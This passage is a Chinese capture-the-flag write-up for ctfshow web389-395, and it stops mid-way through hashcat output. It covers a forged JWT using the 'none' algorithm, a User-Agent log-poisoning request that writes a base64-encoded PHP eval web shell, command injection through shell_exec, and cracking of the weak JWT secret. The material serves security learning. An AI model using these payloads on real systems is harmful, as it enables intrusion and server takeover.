<figure class="highlight php"><figcaption><span>/debug/index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$html</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;php -f &#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;调试结果已写入日志&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;file not exist&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="web389-395"><a href="#web389-395" class="headerlink" title="web389-395"></a>web389-395</h2><p>打上题 payload 提示权限不足，cookie 多了一个 jwt，可以 none 绕过  </p>
<figure class="highlight json"><figcaption><span>payload.json</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;none&quot;</span><span class="punctuation">,</span><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span><span class="number">1656478102</span><span class="punctuation">,</span><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span><span class="number">1656485302</span><span class="punctuation">,</span><span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span><span class="number">1656478102</span><span class="punctuation">,</span><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;61840705ebb1ad9d47f874d9104773db&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NjQ3ODEwMiwiZXhwIjoxNjU2NDg1MzAyLCJuYmYiOjE2NTY0NzgxMDIsInN1YiI6ImFkbWluIiwianRpIjoiNjE4NDA3MDVlYmIxYWQ5ZDQ3Zjg3NGQ5MTA0NzczZGIifQ</span><br><span class="line"></span><br><span class="line">payload<span class="punctuation">:</span></span><br><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NjQ3ODEwMiwiZXhwIjoxNjU2NDg1MzAyLCJuYmYiOjE2NTY0NzgxMDIsInN1YiI6ImFkbWluIiwianRpIjoiNjE4NDA3MDVlYmIxYWQ5ZDQ3Zjg3NGQ5MTA0NzczZGIifQ.</span><br></pre></td></tr></table></figure>
<p>写 shell</p>
<figure class="highlight http"><figcaption><span>raw</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/debug/?file=/var/log/nginx/access.log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>f2ff88d8-9cbb-4a28-9c14-34e508c8791c.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php file_put_contents(base64_decode(&#x27;L3Zhci93d3cvaHRtbC9zaGwucGhw&#x27;),base64_decode(&#x27;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4g&#x27;)) ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17eca237f064ad-05ba9f2afdfcf8-f791539-144000-17eca237f0779c; auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NjQ3ODEwMiwiZXhwIjoxNjU2NDg1MzAyLCJuYmYiOjE2NTY0NzgxMDIsInN1YiI6ImFkbWluIiwianRpIjoiNjE4NDA3MDVlYmIxYWQ5ZDQ3Zjg3NGQ5MTA0NzczZGIifQ.</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到对这里的改动  </p>
<figure class="highlight php"><figcaption><span>/debug/index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;jwt.php&#x27;</span>);</span><br><span class="line"><span class="variable">$auth</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$auth</span>))&#123;</span><br><span class="line">	<span class="variable">$getPayload_test</span>=<span class="title class_">Jwt</span>::<span class="title function_ invoke__">verifyToken</span>(<span class="variable">$auth</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getPayload_test</span>) &amp;&amp; <span class="variable">$getPayload_test</span>[<span class="string">&#x27;sub&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable">$html</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;php -f &#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;已写入日志&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;file not exist&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;权限不足&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><figcaption><span>/debug/jwt.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * PHP实现jwt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jwt</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//头部</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$header</span>=<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;alg&#x27;</span>=&gt;<span class="string">&#x27;HS256&#x27;</span>, <span class="comment">//生成signature的算法</span></span><br><span class="line">        <span class="string">&#x27;typ&#x27;</span>=&gt;<span class="string">&#x27;JWT&#x27;</span>    <span class="comment">//类型</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用HMAC生成信息摘要时所使用的密钥</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$key</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取不加密的token</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getNullToken</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$payload</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$base64header</span>=<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;alg&quot;</span>=&gt;<span class="string">&quot;None&quot;</span>,<span class="string">&quot;typ&quot;</span>=&gt;<span class="string">&quot;jwt&quot;</span>)));</span><br><span class="line">        <span class="variable">$base64payload</span>=<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="variable">$payload</span>)));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$base64header</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$base64payload</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取jwt token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $payload jwt载荷   格式如下非必须</span></span><br><span class="line"><span class="comment">     * [</span></span><br><span class="line"><span class="comment">     *  &#x27;iss&#x27;=&gt;&#x27;jwt_admin&#x27;,  //该JWT的签发者</span></span><br><span class="line"><span class="comment">     *  &#x27;iat&#x27;=&gt;time(),  //签发时间</span></span><br><span class="line"><span class="comment">     *  &#x27;exp&#x27;=&gt;time()+7200,  //过期时间</span></span><br><span class="line"><span class="comment">     *  &#x27;nbf&#x27;=&gt;time()+60,  //该时间之前不接收处理该Token</span></span><br><span class="line"><span class="comment">     *  &#x27;sub&#x27;=&gt;&#x27;www.admin.com&#x27;,  //面向的用户</span></span><br><span class="line"><span class="comment">     *  &#x27;jti&#x27;=&gt;md5(uniqid(&#x27;JWT&#x27;).time())  //该Token唯一标识</span></span><br><span class="line"><span class="comment">     * ]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$payload</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$payload</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$base64header</span>=<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="built_in">self</span>::<span class="variable">$header</span>,JSON_UNESCAPED_UNICODE));</span><br><span class="line">            <span class="variable">$base64payload</span>=<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$payload</span>,JSON_UNESCAPED_UNICODE));</span><br><span class="line">            <span class="variable">$token</span>=<span class="variable">$base64header</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$base64payload</span>.<span class="string">&#x27;.&#x27;</span>.<span class="built_in">self</span>::<span class="title function_ invoke__">signature</span>(<span class="variable">$base64header</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$base64payload</span>,<span class="built_in">self</span>::<span class="variable">$key</span>,<span class="built_in">self</span>::<span class="variable">$header</span>[<span class="string">&#x27;alg&#x27;</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$token</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyNullToken</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$Token</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tokens</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$Token</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$tokens</span>) != <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$base64header</span>, <span class="variable">$base64payload</span>) = <span class="variable">$tokens</span>;</span><br><span class="line">        <span class="variable">$base64decodeheader</span> = <span class="title function_ invoke__">json_decode</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlDecode</span>(<span class="variable">$base64header</span>), JSON_OBJECT_AS_ARRAY);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$base64decodeheader</span>[<span class="string">&#x27;alg&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$payload</span> = <span class="title function_ invoke__">json_decode</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlDecode</span>(<span class="variable">$base64payload</span>), JSON_OBJECT_AS_ARRAY);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$payload</span>==<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$payload</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证token是否有效,默认验证exp,nbf,iat时间</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $Token 需要验证的token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$Token</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$tokens</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$Token</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$tokens</span>) != <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$base64header</span>, <span class="variable">$base64payload</span>, <span class="variable">$sign</span>) = <span class="variable">$tokens</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取jwt算法</span></span><br><span class="line">        <span class="variable">$base64decodeheader</span> = <span class="title function_ invoke__">json_decode</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlDecode</span>(<span class="variable">$base64header</span>), JSON_OBJECT_AS_ARRAY);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$base64decodeheader</span>[<span class="string">&#x27;alg&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//签名验证</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="title function_ invoke__">signature</span>(<span class="variable">$base64header</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$base64payload</span>, <span class="built_in">self</span>::<span class="variable">$key</span>, <span class="variable">$base64decodeheader</span>[<span class="string">&#x27;alg&#x27;</span>]) !== <span class="variable">$sign</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$payload</span> = <span class="title function_ invoke__">json_decode</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlDecode</span>(<span class="variable">$base64payload</span>), JSON_OBJECT_AS_ARRAY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//签发时间大于当前服务器时间验证失败</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>[<span class="string">&#x27;iat&#x27;</span>]) &amp;&amp; <span class="variable">$payload</span>[<span class="string">&#x27;iat&#x27;</span>] &gt; <span class="title function_ invoke__">time</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//过期时间小宇当前服务器时间验证失败</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>[<span class="string">&#x27;exp&#x27;</span>]) &amp;&amp; <span class="variable">$payload</span>[<span class="string">&#x27;exp&#x27;</span>] &lt; <span class="title function_ invoke__">time</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//该nbf时间之前不接收处理该Token</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>[<span class="string">&#x27;nbf&#x27;</span>]) &amp;&amp; <span class="variable">$payload</span>[<span class="string">&#x27;nbf&#x27;</span>] &gt; <span class="title function_ invoke__">time</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$payload</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * base64UrlEncode   https://jwt.io/  中base64UrlEncode编码实现</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $input 需要编码的字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlEncode</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">strtr</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$input</span>), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * base64UrlEncode  https://jwt.io/  中base64UrlEncode解码实现</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $input 需要解码的字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlDecode</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$remainder</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) % <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remainder</span>) &#123;</span><br><span class="line">            <span class="variable">$addlen</span> = <span class="number">4</span> - <span class="variable">$remainder</span>;</span><br><span class="line">            <span class="variable">$input</span> .= <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;=&#x27;</span>, <span class="variable">$addlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strtr</span>(<span class="variable">$input</span>, <span class="string">&#x27;-_&#x27;</span>, <span class="string">&#x27;+/&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * HMACSHA256签名   https://jwt.io/  中HMACSHA256签名实现</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $input 为base64UrlEncode(header).&quot;.&quot;.base64UrlEncode(payload)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $alg   算法方式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">signature</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$input</span>, <span class="keyword">string</span> <span class="variable">$key</span>, <span class="keyword">string</span> <span class="variable">$alg</span> = <span class="string">&#x27;HS256&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$alg_config</span>=<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;HS256&#x27;</span>=&gt;<span class="string">&#x27;sha256&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="variable">$alg_config</span>[<span class="variable">$alg</span>], <span class="variable">$input</span>, <span class="variable">$key</span>,<span class="literal">true</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里 123456 也是弱口令，可以爆破出来  </p>
<figure class="highlight powershell"><figcaption><span>input</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> F:\tools\hashcat<span class="literal">-6</span>.<span class="number">2.5</span>&gt; .\hashcat.exe F:\test\ctfshow\web389\jwts.txt <span class="literal">-m</span> <span class="number">16500</span> <span class="literal">-a</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: <span class="number">16500</span> (JWT (JSON Web Token))</span><br><span class="line">Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG...FCbGO4</span><br><span class="line">Time.Started.....: Wed Jun <span class="number">29</span> <span class="number">13</span>:<span class="number">52</span>:<span class="number">12</span> <span class="number">2022</span> (<span class="number">0</span> secs)</span><br><span class="line">Time.Estimated...: Wed Jun <span class="number">29</span> <span class="number">13</span>:<span class="number">52</span>:<span class="number">12</span> <span class="number">2022</span> (<span class="number">0</span> secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Mask.......: ?<span class="number">1</span>?<span class="number">2</span>?<span class="number">2</span>?<span class="number">2</span>?<span class="number">2</span>?<span class="number">2</span> [<span class="number">6</span>]</span><br><span class="line">Guess.Charset....: <span class="literal">-1</span> ?l?d?u, <span class="literal">-2</span> ?l?d, <span class="literal">-3</span> ?l?d*!<span class="variable">$</span>@_, <span class="literal">-4</span> Undefined</span><br><span class="line">Guess.Queue......: <span class="number">6</span>/<span class="number">15</span> (<span class="number">40.00</span>%)</span><br><span class="line">Speed.<span class="comment">#1.........:   319.5 MH/s (10.59ms) @ Accel:2 Loops:128 Thr:512 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#3.........: 53287.8 kH/s (6.64ms) @ Accel:32 Loops:8 Thr:256 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#*.........:   372.8 MH/s</span></span><br><span class="line">Recovered........: <span class="number">1</span>/<span class="number">1</span> (<span class="number">100.00</span>%) Digests</span><br><span class="line">Progress.........: <span class="number">4456448</span>/<span class="number">3748902912</span> (<span class="number">0.12</span>%)</span><br><span class="line">Rejected.........: <span class="number">0</span>/<span class="number">4456448</span> (<span class="number">0.00</span>%)</span><br><span class="line">Restore.Point....: <span class="number">0</span>/<span class="number">1679616</span> (<span class="number">0.00</span>%)</span><br><span 